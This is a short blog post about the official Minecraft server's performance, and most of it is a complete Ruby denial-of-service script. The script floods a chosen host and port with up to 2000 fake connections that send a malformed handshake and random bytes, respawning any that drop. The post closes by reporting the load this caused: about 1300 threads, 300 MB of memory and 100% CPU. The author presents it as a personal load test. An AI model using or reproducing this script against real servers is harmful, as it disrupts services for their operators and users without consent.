Minecraft DoS
=============

As I talked about in [this](#page=blog/posts/craftd.md&type=blog) post, the official Minecraft
server has few performance problems.

Well, I wanted to test it myself to see what was really going on, not liking Python and not wanting
to install twisted and such I wrote a small Ruby script to simulate the same thing.

    #! /usr/bin/env ruby
    require 'socket'
    require 'thread'

    HOST, PORT = ARGV.shift.split(':') + [25565]
    COUNT      = ARGV.shift || 2000

    sockets = Class.new(Array) {
      def initialize (number)
        @number = number
      end

      def spawn
        self.each {|s|
          self.delete(s) if s.closed?
        }

        to_spawn = @number - self.length

        if to_spawn > 0
          puts "Spawning #{to_spawn} fake connections"

          1.upto(to_spawn) {
            socket = TCPSocket.new(HOST, PORT)
            socket.write_nonblock("\x02\xff\xff")

            self << socket
          }
        end
      end
    }.new(COUNT)

    thread = Thread.new {
      loop do
        sockets.each {|socket|
          begin
            socket.write_nonblock((rand * 255).floor.chr)
          rescue Exception => e
            socket.close rescue nil
          end
        }

        begin; sockets.spawn; rescue; return; end

        sleep 0.5
      end
    }

    thread.join

Well, the result was that the server still let people inside, but it created "Threads: 650 + 650",
used 300 MB of memory for nothing and kept the CPU at 100%.

Not a good result but not even an apocalyptic one.
